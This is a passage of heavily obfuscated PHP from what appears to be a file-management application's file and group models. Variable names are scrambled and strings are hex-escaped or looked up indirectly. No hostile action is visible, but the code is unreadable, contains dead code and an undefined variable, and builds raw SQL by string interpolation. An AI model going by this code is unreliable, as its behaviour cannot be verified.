$¹—àŞ‚×[$¾°€™™ ]++; } $€ˆµó¦¹ = array(); foreach ($¹—àŞ‚× as $§ÏÚ‘Óš => $’ èğúÜ) { $¾°€™™  = $’ èğúÜ . $·À¶Æ·[12]; if (!$€ˆµó¦¹[$¾°€™™ ]) { $€ˆµó¦¹[$¾°€™™ ] = array(); } $€ˆµó¦¹[$¾°€™™ ][] = $§ÏÚ‘Óš; } foreach ($€ˆµó¦¹ as $’ èğúÜ => $ °øßİÃ) { if (!$ °øßİÃ) { continue; } $’ èğúÜ = $ŸÕÂ³Å» ? $’ èğúÜ : -intval($’ èğúÜ); $şÖ½º»ã = array($·À¶Æ·[562] => array($·À¶Æ·[7], $ °øßİÃ)); if ($’ èğúÜ < 0) { $şÖ½º»ã[$·À¶Æ·[2204]] = array($·À¶Æ·[1136], abs($’ èğúÜ)); } $this->where($şÖ½º»ã)->setAdd($·À¶Æ·[2204], $’ èğúÜ); } } public function findByHash($ÜÀË„±Ş, $ı«Ëâ»Ã = false) { $´“Æúµ¼ =& $_SERVER[Ï×Œõ”û]; if (!$ÜÀË„±Ş && !$ı«Ëâ»Ã) { return !1; } $±¡ßÍ¾Ä = array($´“Æúµ¼[2198] => $ÜÀË„±Ş); if ($ı«Ëâ»Ã) { $±¡ßÍ¾Ä = array($´“Æúµ¼[2199] => $ı«Ëâ»Ã); } return $this->order($´“Æúµ¼[2205])->where($±¡ßÍ¾Ä)->find(); } public function clearEmpty($“ÚÖİº = 1) { $Š¦Çù›Å =& $_SERVER[Ï×Œõ”û]; $•äÖ–Œø = time() - 3600 * 24 * $“ÚÖİº; $ÏàïàºÂ = $Š¦Çù›Å[2206] . $•äÖ–Œø; $¯¼ö¿ßû = $this->where($ÏàïàºÂ)->select(); if (!$¯¼ö¿ßû) { return; } $è‚ÊÉé  = new Task($Š¦Çù›Å[2207], $Š¦Çù›Å[12], count($¯¼ö¿ßû)); foreach ($¯¼ö¿ßû as $ŠÀ‡¥´ê) { $è‚ÊÉé ->update(1); $this->resetFile($ŠÀ‡¥´ê); } $è‚ÊÉé ->end(); } public function resetFile($ò§ı¨Ï’) { $¡ƒ’•”Ğ =& $_SERVER[Ï×Œõ”û]; $‰§Ø† = array($¡ƒ’•”Ğ[563] => $ò§ı¨Ï’[$¡ƒ’•”Ğ[562]]); $şó²ÈæÅ = Model($¡ƒ’•”Ğ[1487])->where($‰§Ø†)->count(); $ „™‹­½ = Model($¡ƒ’•”Ğ[2208])->where($‰§Ø†)->count(); $Ö•öûÍ = intval($şó²ÈæÅ) + intval($ „™‹­½); if ($Ö•öûÍ == 0) { Model($¡ƒ’•”Ğ[2209])->delete($ò§ı¨Ï’[$¡ƒ’•”Ğ[562]]); $this->where($‰§Ø†)->delete(); $this->metaSet($ò§ı¨Ï’[$¡ƒ’•”Ğ[562]], null, null); if (!IO::isFile($ò§ı¨Ï’[$¡ƒ’•”Ğ[87]])) { write_log(array($¡ƒ’•”Ğ[2210], ACTION, $ò§ı¨Ï’), $¡ƒ’•”Ğ[1322]); return !1; } IO::remove($ò§ı¨Ï’[$¡ƒ’•”Ğ[87]]); write_log(ACTION . $¡ƒ’•”Ğ[947] . KodUser::id() . $¡ƒ’•”Ğ[2211] . $ò§ı¨Ï’[$¡ƒ’•”Ğ[562]] . $¡ƒ’•”Ğ[1999] . $ò§ı¨Ï’[$¡ƒ’•”Ğ[79]] . $¡ƒ’•”Ğ[201] . $ò§ı¨Ï’[$¡ƒ’•”Ğ[87]], $¡ƒ’•”Ğ[2210]); return; } if ($ò§ı¨Ï’[$¡ƒ’•”Ğ[2204]] != $Ö•öûÍ) { $this->where($‰§Ø†)->save(array($¡ƒ’•”Ğ[2197] => $Ö•öûÍ)); } } public function storageInfo($áÍ€øîÔ = false) { $ŸãŞúñÉ =& $_SERVER[Ï×Œõ”û]; $ÓÏ¡°…ä = $this->count() + 0.0; $óä´ëªİ = 0; $¾„µ· = 1; $ÕÏÂüİ = 0; $¾ë§ãæŠ = 5000; for ($Ïòğ±°“ = 0; $Ïòğ±°“ < $ÓÏ¡°…ä; $Ïòğ±°“ = $Ïòğ±°“ + $¾ë§ãæŠ) { $‘¯±ì“¼ = $this->limit($Ïòğ±°“, $Ïòğ±°“ + $¾ë§ãæŠ)->select(); foreach ($‘¯±ì“¼ as $½ò…ÈÔÈ) { $¾„µ· += $½ò…ÈÔÈ[$ŸãŞúñÉ[79]] * $½ò…ÈÔÈ[$ŸãŞúñÉ[2204]]; $óä´ëªİ += $½ò…ÈÔÈ[$ŸãŞúñÉ[79]] * ($½ò…ÈÔÈ[$ŸãŞúñÉ[2204]] - 1); $ÕÏÂüİ += $½ò…ÈÔÈ[$ŸãŞúñÉ[2204]]; } } $ÑÒùÅ¯ä = array($ŸãŞúñÉ[2212] => $¾„µ·, $ŸãŞúñÉ[2213] => $óä´ëªİ, $ŸãŞúñÉ[2214] => $óä´ëªİ / $¾„µ·, $ŸãŞúñÉ[83] => $ÓÏ¡°…ä, $ŸãŞúñÉ[2215] => $ÕÏÂüİ); return $ÑÒùÅ¯ä; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\x6d\145" => "\x67\162\x6f\x75\160\x5f\155\145\x74\x61", "\155\x65\x74\x61\x46\x69\145\x6c\x64" => "\147\162\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($äüäı²À) { $ÓÑ€©„½ =& $_SERVER[Ï×Œõ”û]; return array($ÓÑ€©„½[2216] => array($äüäı²À[0], $ÓÑ€©„½[2217]), $ÓÑ€©„½[2218] => array($äüäı²À[0], $ÓÑ€©„½[2219])); } protected function ___getInfo($¸ª¬Èíó) { $»¸šÛ•í = $this->getInfoSimple($¸ª¬Èíó); if (!$»¸šÛ•í) { return !1; } return $this->_listDataApplyItem($»¸šÛ•í); } protected function ___getInfoSimple($–Ÿ’ô°«) { $ò’—Ï…Ò = array($_SERVER[Ï×Œõ”û][1449] => intval($–Ÿ’ô°«)); $”ö¤ôŒ× = $this->where($ò’—Ï…Ò)->find(); return is_array($”ö¤ôŒ×) ? $”ö¤ôŒ× : array(); } protected function groupAdd($ú˜éÇÑ­) { $©ßğœ´· =& $_SERVER[Ï×Œõ”û]; if (!$ú˜éÇÑ­[$©ßğœ´·[192]] && isset($ú˜éÇÑ­[$©ßğœ´·[1449]]) && $ú˜éÇÑ­[$©ßğœ´·[1449]] == 1) { if ($¾•Ø‘ş = $this->getInfoSimple($ú˜éÇÑ­[$©ßğœ´·[1449]], !0)) { return $ú˜éÇÑ­[$©ßğœ´·[1449]]; } } else { $¾•Ø‘ş = $this->getInfoSimple($ú˜éÇÑ­[$©ßğœ´·[192]]); if (!$¾•Ø‘ş) { return !1; } } $ç…ìÕª« = $©ßğœ´·[618]; if ($¾•Ø‘ş[$©ßğœ´·[609]]) { $ç…ìÕª« = $¾•Ø‘ş[$©ßğœ´·[609]] . $¾•Ø‘ş[$©ßğœ´·[1449]] . $©ßğœ´·[50]; } $ñÀöÆ« = array($©ßğœ´·[514] => $this->groupNameAuto($ú˜éÇÑ­[$©ßğœ´·[192]], $ú˜éÇÑ­[$©ßğœ´·[32]]), $©ßğœ´·[497] => $ú˜éÇÑ­[$©ßğœ´·[192]], $©ßğœ´·[680] => $ç…ìÕª«, $©ßğœ´·[2220] => $ú˜éÇÑ­[$©ßğœ´·[2124]], $©ßğœ´·[2221] => 0, $©ßğœ´·[2141] => 0); $ú˜éÇÑ­[$©ßğœ´·[32]] = $ñÀöÆ«[$©ßğœ´·[32]]; if (isset($ú˜éÇÑ­[$©ßğœ´·[2159]])) { $ñÀöÆ«[$©ßğœ´·[2159]] = $ú˜éÇÑ­[$©ßğœ´·[2159]]; } else { $º°ÚûĞ = $this->max($©ßğœ´·[2159]); if (!$º°ÚûĞ) { $º°ÚûĞ = 0; } $ñÀöÆ«[$©ßğœ´·[2159]] = $º°ÚûĞ + 1; } if (!empty($ú˜éÇÑ­[$©ßğœ´·[1449]])) { $ñÀöÆ«[$©ßğœ´·[1449]] = $ú˜éÇÑ­[$©ßğœ´·[1449]]; } $úİ®÷í¥ = $this->add($ñÀöÆ«); $this->groupMetaEdit($úİ®÷í¥, $ú˜éÇÑ­); Model($©ßğœ´·[1487])->groupRootAdd($úİ®÷í¥); $this->_clearCache($ú˜éÇÑ­[$©ßğœ´·[192]]); return $úİ®÷í¥; } protected function groupEdit($¿ØĞÆÔ‚, $ğÛÎ–æõ) { $÷Õ¡˜ï =& $_SERVER[Ï×Œõ”û]; $È¹õ¨µ‡ = $this->getInfoSimple($¿ØĞÆÔ‚); if (!$È¹õ¨µ‡) { return !1; } if (!empty($ğÛÎ–æõ[$÷Õ¡˜ï[192]])) { $¬µ”¬ÕÊ = $this->getInfoSimple($ğÛÎ–æõ[$÷Õ¡˜ï[192]]); if (!$¬µ”¬ÕÊ) { return !1; } if ($È¹õ¨µ‡[$÷Õ¡˜ï[1449]] == $¬µ”¬ÕÊ[$÷Õ¡˜ï[1449]]) { return !1; } if ($ğÛÎ–æõ[$÷Õ¡˜ï[192]] != $È¹õ¨µ‡[$÷Õ¡˜ï[192]]) { if ($¬µ”¬ÕÊ[$÷Õ¡˜ï[609]] !== $È¹õ¨µ‡[$÷Õ¡˜ï[609]] && strpos($¬µ”¬ÕÊ[$÷Õ¡˜ï[609]], $È¹õ¨µ‡[$÷Õ¡˜ï[609]] . $È¹õ¨µ‡[$÷Õ¡˜ï[1449]] . $÷Õ¡˜ï[50]) === 0) { return !1; } $ğÛÎ–æõ[$÷Õ¡˜ï[680]] = $¬µ”¬ÕÊ[$÷Õ¡˜ï[609]] . $ğÛÎ–æõ[$÷Õ¡˜ï[192]] . $÷Õ¡˜ï[50]; $this->_changeChildLevel($È¹õ¨µ‡, $¬µ”¬ÕÊ); $this->_clearCache($¬µ”¬ÕÊ[$÷Õ¡˜ï[1449]]); $this->_clearCache($È¹õ¨µ‡[$÷Õ¡˜ï[192]]); } } $this->groupMetaEdit($¿ØĞÆÔ‚, $ğÛÎ–æõ); $this->_clearChildrenCache($È¹õ¨µ‡); return $this->where(array($÷Õ¡˜ï[2222] => $¿ØĞÆÔ‚))->save($ğÛÎ–æõ); } private function groupMetaEdit($áÓ×§Ğ, &$Ç†µÓ³) { $ğçúş‚ =& $_SERVER[Ï×Œõ”û]; if (isset($Ç†µÓ³[$ğçúş‚[32]])) { $this->setNamePinyin($áÓ×§Ğ, $Ç†µÓ³[$ğçúş‚[32]]); } if (isset($Ç†µÓ³[$ğçúş‚[2223]])) { $ÅÕá†š× = array($ğçúş‚[2223] => $Ç†µÓ³[$ğçúş‚[2223]], $ğçúş‚[2224] => $Ç†µÓ³[$ğçúş‚[2224]]); unset($Ç†µÓ³[$ğçúş‚[2223]]); unset($Ç†µÓ³[$ğçúş‚[2224]]); if (isset($Ç†µÓ³[$ğçúş‚[2225]])) { $Ãó‡¹æ = $ğçúş‚[1445] . $áÓ×§Ğ; $—ÀÓÓÈí = $ğçúş‚[1444]; $ñÍ¤ë³¾ = $Ç†µÓ³[$ğçúş‚[2225]] ? $Ç†µÓ³[$ğçúş‚[2225]] : $ğçúş‚[12]; $çø¾ğ®é = Model($ğçúş‚[1443])->get($Ãó‡¹æ, $—ÀÓÓÈí); $çø¾ğ®é = $çø¾ğ®é ? $çø¾ğ®é : $ğçúş‚[12]; if ($çø¾ğ®é != $ñÍ¤ë³¾) { if (!$ñÍ¤ë³¾ && $çø¾ğ®é) { Model($ğçúş‚[1443])->remove($Ãó‡¹æ, $—ÀÓÓÈí); } else { if ($ñÍ¤ë³¾) { Model($ğçúş‚[1443])->set($Ãó‡¹æ, $ñÍ¤ë³¾, $—ÀÓÓÈí); } } } $ÅÕá†š×[$ğçúş‚[2225]] = $ñÍ¤ë³¾; } $this->metaSet($áÓ×§Ğ, $ÅÕá†š×); } } private function _clearChildrenCache($ğÜí¡Œ¶) { $¨Ñ›†¼§ =& $_SERVER[Ï×Œõ”û]; $ÓãêôÓŠ = array($¨Ñ›†¼§[680] => array($¨Ñ›†¼§[640], $ğÜí¡Œ¶[$¨Ñ›†¼§[609]] . $ğÜí¡Œ¶[$¨Ñ›†¼§[1449]] . $¨Ñ›†¼§[641])); $¡ŠÛ€ˆ = $this->field($¨Ñ›†¼§[1449])->where($ÓãêôÓŠ)->select(); foreach ($¡ŠÛ€ˆ as $šÔ¢¹¸¾) { $this->_clearCache($šÔ¢¹¸¾[$¨Ñ›†¼§[1449]]); } } private function _clearCache($§ª·£ùÁ) { $Š„¹µ¡† =& $_SERVER[Ï×Œõ”û]; $this->cacheFunctionClear($Š„¹µ¡†[2226], $§ª·£ùÁ); $this->cacheFunctionClear($Š„¹µ¡†[2227], $§ª·£ùÁ); } private function _changeChildLevel($›áÓ°ğ×, $øï‚ßÃ, $€òÀ–Ë = false) { $¼ÒÃå±ø =& $_SERVER[Ï×Œõ”û]; $¿’ŞŞº÷ = $›áÓ°ğ×[$¼ÒÃå±ø[609]] . $›áÓ°ğ×[$¼ÒÃå±ø[1449]] . $¼ÒÃå±ø[50]; $Ó´ª³Ú = $øï‚ßÃ[$¼ÒÃå±ø[609]] . $øï‚ßÃ[$¼ÒÃå±ø[1449]] . $¼ÒÃå±ø[50] . $›áÓ°ğ×[$¼ÒÃå±ø[1449]] . $¼ÒÃå±ø[50]; if ($€òÀ–Ë) { $Ó´ª³Ú = $øï‚ßÃ[$¼ÒÃå±ø[609]] . $øï‚ßÃ[$¼ÒÃå±ø[1449]] . $¼ÒÃå±ø[50]; } $äíĞ¦¢ = array($¼ÒÃå±ø[680] => array($¼ÒÃå±ø[640], $›áÓ°ğ×[$¼ÒÃå±ø[609]] . $›áÓ°ğ×[$¼ÒÃå±ø[1449]] . $¼ÒÃå±ø[641])); $ø¹­Ëå– = array($¼ÒÃå±ø[680] => array($¼ÒÃå±ø[689], "\x72\x65\160\x6c\141\143\x65\50\160\141\x72\145\156\x74\x4c\145\x76\145\154\x2c\x27{$¿’ŞŞº÷}\x27\x2c\x27{$Ó´ª³Ú}\47\x29")); $this->_clearChildrenCache($›áÓ°ğ×); $this->where($äíĞ¦¢)->data($ø¹­Ëå–)->save(); } public function setNamePinyin($Åƒºè¯Ú, $æÙÂÎìÅ = false) { $Ìî´ñˆ =& $_SERVER[Ï×Œõ”û]; if (!$æÙÂÎìÅ) { $¿ñ…Ñ±˜ = $this->getInfoSimple($Åƒºè¯Ú); $æÙÂÎìÅ = $¿ñ…Ñ±˜[$Ìî´ñˆ[32]]; } if (!Input::check($æÙÂÎìÅ, $Ìî´ñˆ[683])) { $this->metaSet($Åƒºè¯Ú, $Ìî´ñˆ[557], null); $this->metaSet($Åƒºè¯Ú, $Ìî´ñˆ[556], null); return; } $ÔÃ…¿ğ = array($Ìî´ñˆ[557] => str_replace($Ìî´ñˆ[53], $Ìî´ñˆ[12], Pinyin::get($æÙÂÎìÅ)), $Ìî´ñˆ[556] => Pinyin::get($æÙÂÎìÅ, $Ìî´ñˆ[684])); $this->metaSet($Åƒºè¯Ú, $ÔÃ…¿ğ); } protected function metaSet($€¯Ç„İ›, $Øé×ú´Ö = null, $‰Î«Õµ¥ = null) { $this->_clearCache($€¯Ç„İ›); return parent::metaSet($€¯Ç„İ›, $Øé×ú´Ö, $‰Î«Õµ¥); } protected function groupStatus($É®Ã€ö™, $‘Ûõï”) { $Û™úı€† =& $_SERVER[Ï×Œõ”û]; $‘÷‹šˆû = $this->getInfoSimple($É®Ã€ö™); if (!$‘÷‹šˆû) { return !1; } $this->_clearCache($É®Ã€ö™); return $this->metaSet($É®Ã€ö™, $Û™úı€†[856], $‘Ûõï”); if ($‘Ûõï” == $Û™úı€†[91]) { $Å¸ÎÜ¾‡ = $this->parentLevelArray($‘÷‹šˆû[$Û™úı€†[609]]); } else { } $Å¸ÎÜ¾‡[] = $‘÷‹šˆû[$Û™úı€†[1449]]; $Ã‡û®¸ä = array(); foreach ($Å¸ÎÜ¾‡ as $É®Ã€ö™) { $Ã‡û®¸ä[] = array($Û™úı€†[1449] => $É®Ã€ö™, $Û™úı€†[95] => $Û™úı€†[856], $Û™úı€†[452] => $‘Ûõï”); $this->_clearCache($É®Ã€ö™); } return Model($Û™úı€†[2228])->addAll($Ã‡û®¸ä, array(), !0); } protected function groupRemove($ª¡Î”ê, $±½ÆÅ™Ç = false) { $…òÈŠÕú =& $_SERVER[Ï×Œõ”û]; $ğ‰È“¥Ô = array($…òÈŠÕú[1449] => $ª¡Î”ê); $ÖÊ‘ÛÕ = $this->where($ğ‰È“¥Ô)->find(); if (!$ÖÊ‘ÛÕ || $ÖÊ‘ÛÕ[$…òÈŠÕú[192]] == 0) { return !1; } if (!$±½ÆÅ™Ç) { $ë©®»Ä½ = $this->getInfoSimple($ÖÊ‘ÛÕ[$…òÈŠÕú[192]]); $this->_changeChildLevel($ÖÊ‘ÛÕ, $ë©®»Ä½, !0); $this->where(array($…òÈŠÕú[192] => $ª¡Î”ê))->save(array($…òÈŠÕú[192] => $ÖÊ‘ÛÕ[$…òÈŠÕú[192]])); $this->_clearCache($ë©®»Ä½[$…òÈŠÕú[1449]]); } Model($…òÈŠÕú[2228])->where($ğ‰È“¥Ô)->delete(); Model($…òÈŠÕú[2229])->where($ğ‰È“¥Ô)->delete(); Model($…òÈŠÕú[939])->groupRootRemove($ª¡Î”ê); $this->_clearCache($ÖÊ‘ÛÕ[$…òÈŠÕú[192]]); return $this->where($ğ‰È“¥Ô)->delete(); } protected function groupSort($œŒÒ¥‡¦) { $°€ãŒ“ä =& $_SERVER[Ï×Œõ”û]; $‹Š°Ğõ = array(); foreach ($œŒÒ¥‡¦ as $ßÜÇÁÕ => $à³ƒ±Ö) { $‹Š°Ğõ[] = array($°€ãŒ“ä[1449], $à³ƒ±Ö, $°€ãŒ“ä[2159], $ßÜÇÁÕ + 1); } $this->saveAll($‹Š°Ğõ); } public function listData() { $îƒ€ö¥¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($îƒ€ö¥¸[$_SERVER[Ï×Œõ”û][447]]); return $îƒ€ö¥¸; } private function _makeOrder($„˜ÑÂÀ– = '') { $¿…Õ¨„ =& $_SERVER[Ï×Œõ”û]; $íËÜö½¬ = array($¿…Õ¨„[1449], $¿…Õ¨„[32], $¿…Õ¨„[2126], $¿…Õ¨„[233]); $ËôÚ““ = array($¿…Õ¨„[542] => $¿…Õ¨„[543], $¿…Õ¨„[544] => $¿…Õ¨„[545]); $èåÇÍÖ¿ = Input::get($¿…Õ¨„[549], $¿…Õ¨„[7], $¿…Õ¨„[2141], $íËÜö½¬); $«øÂ‡¦È = Input::get($¿…Õ¨„[550], $¿…Õ¨„[7], $¿…Õ¨„[2230], array($¿…Õ¨„[2230], $¿…Õ¨„[544])); $«øÂ‡¦È = $ËôÚ““[$«øÂ‡¦È]; $„˜ÑÂÀ– = $„˜ÑÂÀ– . "{$èåÇÍÖ¿}\x20{$«øÂ‡¦È}\x2c\x20\x67\x72\x6f\165\x70\111\104\x20\x61\163\143"; return $this->order($„˜ÑÂÀ–); } public function listChild($ƒ€”Èù¡) { $¼â¶±ş‰ =& $_SERVER[Ï×Œõ”û]; $ê§Œ–ôñ = $this->where(array($¼â¶±ş‰[192] => $ƒ€”Èù¡))->_makeOrder()->selectPage(200); $this->_listDataApply($ê§Œ–ôñ[$¼â¶±ş‰[447]]); return $ê§Œ–ôñ; } public function listChildIds($Ğ©À¡Ç) { $âÂØÀ =& $_SERVER[Ï×Œõ”û]; if (is_string($„‹ÅöÆ‰)) { $Ğ©À¡Ç = explode($âÂØÀ[50], $Ğ©À¡Ç); } $áÉ¹Èáå = $this->where(array($âÂØÀ[1449] => array($âÂØÀ[7], $Ğ©À¡Ç)))->field($âÂØÀ[2231])->select(); if (!$áÉ¹Èáå) { return !1; } $²ÃÆ¼¾ï = array(); foreach ($áÉ¹Èáå as $ÉÏÄ©) { $²ÃÆ¼¾ï[] = "\163\145\x6c\145\143\x74\40\147\162\x6f\x75\160\111\x44\40\146\x72\157\155\40\140\147\x72\157\165\160\140\x20\167\x68\145\162\x65\x20\x70\141\x72\x65\156\x74\x4c\145\166\145\154\x20\154\x69\x6b\x65\x20\x27{$ÉÏÄ©[$âÂØÀ[609]]}{$ÉÏÄ©[$âÂØÀ[1449]]}\x2c\45\x27"; } $²ÃÆ¼¾ï = implode($âÂØÀ[2232], $²ÃÆ¼¾ï); $áÉ¹Èáå = $this->query($²ÃÆ¼¾ï); if (!$áÉ¹Èáå) { return array(); } $Ğ©À¡Ç = array_to_keyvalue($áÉ¹Èáå, $âÂØÀ[12], $âÂØÀ[1449]); return array_unique($Ğ©À¡Ç); } public function listByID($‘ß¡ÙÆÏ) { $–¡´Ç =& $_SERVER[Ï×Œõ”û]; if (!$‘ß¡ÙÆÏ) { return array(); } $‡Ò¿›¯ = array($–¡´Ç[1449] => array($–¡´Ç[7], $‘ß¡ÙÆÏ)); $·Şñëœû = $this->where($‡Ò¿›¯)->select(); $·Şñëœû = array_sort_keep($·Şñëœû, $–¡´Ç[1449], $‘ß¡ÙÆÏ); $this->_listDataApply($·Şñëœû); return $·Şñëœû; } public function listSearch($È¥Ï·™ñ) { $ñˆà«© =& $_SERVER[Ï×Œõ”û]; $ß†ã«‘  = trim($È¥Ï·™ñ[$ñˆà«©[2233]]); $°¡÷ßìË = explode($ñˆà«©[53], $ß†ã«‘ ); if (!$ß†ã«‘  || count($°¡÷ßìË) == 1) { return $this->listSearchNow($È¥Ï·™ñ); } $“‚ÑÜş­ = array($ñˆà«©[447] => array()); foreach ($°¡÷ßìË as $•½±¦Ç„) { if (!trim($•½±¦Ç„)) { continue; } $È¥Ï·™ñ[$ñˆà«©[2233]] = $•½±¦Ç„; $³®µÖƒ‰ = $this->listSearchNow($È¥Ï·™ñ); $“‚ÑÜş­[$ñˆà«©[447]] = array_merge($“‚ÑÜş­[$ñˆà«©[447]], $³®µÖƒ‰[$ñˆà«©[447]]); } $“‚ÑÜş­[$ñˆà«©[447]] = array_unique_by_key($“‚ÑÜş­[$ñˆà«©[447]], $ñˆà«©[1449]); $“‚ÑÜş­[$ñˆà«©[444]] = array($ñˆà«©[445] => count($“‚ÑÜş­[$ñˆà«©[447]]), $ñˆà«©[441] => 20, $ñˆà«©[430] => 1, $ñˆà«©[446] => 1); return $“‚ÑÜş­; } public function listSearchNow($šÈüöÑŒ) { $ÛæÈ£à =& $_SERVER[Ï×Œõ”û]; $¾¿‹“İ  = trim($šÈüöÑŒ[$ÛæÈ£à[2233]]); $–Ò—¯¹¹ = isset($šÈüöÑŒ[$ÛæÈ£à[2234]]) ? $šÈüöÑŒ[$ÛæÈ£à[2234]] : !1; if (!trim($¾¿‹“İ )) { return !1; } $¾¿‹“İ  = str_replace($ÛæÈ£à[2235], $ÛæÈ£à[2236], $¾¿‹“İ ); $ˆé™ğšÑ = array($ÛæÈ£à[1449] => array($ÛæÈ£à[471], "{$¾¿‹“İ }\45"), $ÛæÈ£à[32] => array($ÛæÈ£à[471], "\45{$¾¿‹“İ }\45"), $ÛæÈ£à[1121] => $ÛæÈ£à[2237]); if ($–Ò—¯¹¹) { $¤ü£–ô¤ = $this->getInfoSimple($–Ò—¯¹¹); $Š£Û§Ã = $¤ü£–ô¤[$ÛæÈ£à[609]] . $–Ò—¯¹¹ . $ÛæÈ£à[641]; $ˆé™ğšÑ = array($ˆé™ğšÑ, array($ÛæÈ£à[609] => array($ÛæÈ£à[471], $Š£Û§Ã))); } $ˆé™ğšÑ = $this->parseWhereLike($ˆé™ğšÑ); $‰Å‚´µÇ = $this->_makeOrder()->where($ˆé™ğšÑ)->selectPage(20); $‰Å‚´µÇ = $‰Å‚´µÇ ? $‰Å‚´µÇ : array($ÛæÈ£à[447] => array(), $ÛæÈ£à[444] => array()); if (!$‰Å‚´µÇ || count($‰Å‚´µÇ[$ÛæÈ£à[447]]) < 5 && Input::check($¾¿‹“İ , $ÛæÈ£à[395])) { $ä‚ ŞË = $this->groupChildrenAll($–Ò—¯¹¹); $îÖßœÃà = $this->_searchFromMeta($ÛæÈ£à[556], $¾¿‹“İ , 10, $ä‚ ŞË); $ÊÁ›¡ƒö = $this->_searchFromMeta($ÛæÈ£à[557], $¾¿‹“İ , 10, $ä‚ ŞË); $¦‘ÆõŠ± = array_merge($îÖßœÃà, $ÊÁ›¡ƒö, $‰Å‚´µÇ[$ÛæÈ£à[447]]); $‰Å‚´µÇ[$ÛæÈ£à[447]] = array_unique_by_key($¦‘ÆõŠ±, $ÛæÈ£à[1449]); $‰Å‚´µÇ[$ÛæÈ£à[444]][$ÛæÈ£à[445]] = count($‰Å‚´µÇ[$ÛæÈ£à[447]]); $‰Å‚´µÇ[$ÛæÈ£à[444]][$ÛæÈ£à[446]] = ceil($‰Å‚´µÇ[$ÛæÈ£à[444]][$ÛæÈ£à[445]] / $‰Å‚´µÇ[$ÛæÈ£à[444]][$ÛæÈ£à[441]]); } $this->_listDataApply($‰Å‚´µÇ[$ÛæÈ£à[447]]); return $‰Å‚´µÇ; } protected function groupChildrenAll($Æì Ù) { $ÜôúÆğ½ =& $_SERVER[Ï×Œõ”û]; if (!$Æì Ù) { return !1; } if (!is_array($Æì Ù)) { $Æì Ù = array($Æì Ù); } $ğª¼Ì¶È = $Æì Ù; foreach ($Æì Ù as $Û¯“¦í) { $ø”Ò‚Ù· = $this->getInfoSimple($Û¯“¦í); $òèŞÌ½ä = array($ÜôúÆğ½[609] => array($ÜôúÆğ½[471], $ø”Ò‚Ù·[$ÜôúÆğ½[609]] . $Û¯“¦í . $ÜôúÆğ½[641])); $ˆöÎô÷ = $this->field($ÜôúÆğ½[1449])->where($òèŞÌ½ä)->select(); $ğª¼Ì¶È = array_merge($ğª¼Ì¶È, array_to_keyvalue($ˆöÎô÷, $ÜôúÆğ½[12], $ÜôúÆğ½[1449])); } return array_unique($ğª¼Ì¶È); } private function _searchFromMeta($É”¸Ş¢û, $¾ïëÏü, $ã„©§İ¦, $Ú¨Ø°Š’) { $ÈÎìµ =& $_SERVER[Ï×Œõ”û]; $¾ïëÏü = strtolower($¾ïëÏü); $ÚâÒı³Â = array($ÈÎìµ[95] => $É”¸Ş¢û, $ÈÎìµ[452] => array($ÈÎìµ[471], "\x25{$¾ïëÏü}\x25")); $ÚâÒı³Â = $this->parseWhereLike($ÚâÒı³Â); if ($Ú¨Ø°Š’) { $ÚâÒı³Â[$ÈÎìµ[1449]] = array($ÈÎìµ[7], $Ú¨Ø°Š’); } $ıí³Øß¢ = Model($ÈÎìµ[2238])->where($ÚâÒı³Â)->limit($ã„©§İ¦)->select(); if (!$ıí³Øß¢) { return array(); } $ıí³Øß¢ = array_to_keyvalue($ıí³Øß¢, $ÈÎìµ[12], $ÈÎìµ[1449]); $Îİ«Çê© = $this->where(array($ÈÎìµ[2222] => array($ÈÎìµ[7], $ıí³Øß¢)))->select(); if (!$Îİ«Çê©) { return array(); } return $Îİ«Çê©; } protected function _listDataApplyItem($”«åÑş¸) { $ü’î‚‹„ = array($”«åÑş¸); $this->_listDataApply($ü’î‚‹„); return $ü’î‚‹„[0]; } protected function _listDataApply(&$¢÷Ş¾òÑ) { $¯µ…ÛŠ˜ =& $_SERVER[Ï×Œõ”û]; if (!$¢÷Ş¾òÑ) { return; } $‡Ó‘–íÄ = array_to_keyvalue($¢÷Ş¾òÑ, $¯µ…ÛŠ˜[12], $¯µ…ÛŠ˜[1449]); $this->_listAppendChildren($¢÷Ş¾òÑ); $this->_listAppendChildrenMember($¢÷Ş¾òÑ); $this->_listAppendMeta($¢÷Ş¾òÑ, $‡Ó‘–íÄ); $this->_listAppendParent($¢÷Ş¾òÑ); $this->_listAppendSourceRoot($¢÷Ş¾òÑ, $‡Ó‘–íÄ); } private function _listAppendChildren(&$äÓÊíõƒ) { $†ÔÕ¾³Ù =& $_SERVER[Ï×Œõ”û]; $Ç•ƒûĞ = array_to_keyvalue($äÓÊíõƒ, $†ÔÕ¾³Ù[12], $†ÔÕ¾³Ù[1449]); $•Ë¨¹Ø» = array($†ÔÕ¾³Ù[192] => array($†ÔÕ¾³Ù[7], $Ç•ƒûĞ)); $¯êˆæì = array($†ÔÕ¾³Ù[192], $†ÔÕ¾³Ù[2239] => $†ÔÕ¾³Ù[590]); $ÇØ˜¤ƒè = $this->field($¯êˆæì)->where($•Ë¨¹Ø»)->group($†ÔÕ¾³Ù[192])->select(); $şÙºß²˜ = array_to_keyvalue($ÇØ˜¤ƒè, $†ÔÕ¾³Ù[192], $†ÔÕ¾³Ù[590]); foreach ($äÓÊíõƒ as &$ÏÉğìúÁ) { $Ã¢›Ú¯ = $ÏÉğìúÁ[$†ÔÕ¾³Ù[1449]]; $ÏÉğìúÁ[$†ÔÕ¾³Ù[2240]] = isset($şÙºß²˜[$Ã¢›Ú¯]) ? intval($şÙºß²˜[$Ã¢›Ú¯]) : !1; } unset($ÏÉğìúÁ); } private function _listAppendChildrenMember(&$×ë±ßÑÚ) { $½Çò¨“Š =& $_SERVER[Ï×Œõ”û]; $¡¾ıâƒ‚ = array_to_keyvalue($×ë±ßÑÚ, $½Çò¨“Š[12], $½Çò¨“Š[1449]); $ÛˆÛ·Ğü = array($½Çò¨“Š[1449] => array($½Çò¨“Š[7], $¡¾ıâƒ‚)); $”‰Ì¢Èı = array($½Çò¨“Š[1449], $½Çò¨“Š[2239] => $½Çò¨“Š[590]); $ÀæÔ–Ñ = Model($½Çò¨“Š[2229])->field($”‰Ì¢Èı)->where($ÛˆÛ·Ğü)->group($½Çò¨“Š[1449])->select(); $¿ÚÆ®­è = array_to_keyvalue($ÀæÔ–Ñ, $½Çò¨“Š[1449], $½Çò¨“Š[590]); foreach ($×ë±ßÑÚ as &$¢»ç³) { 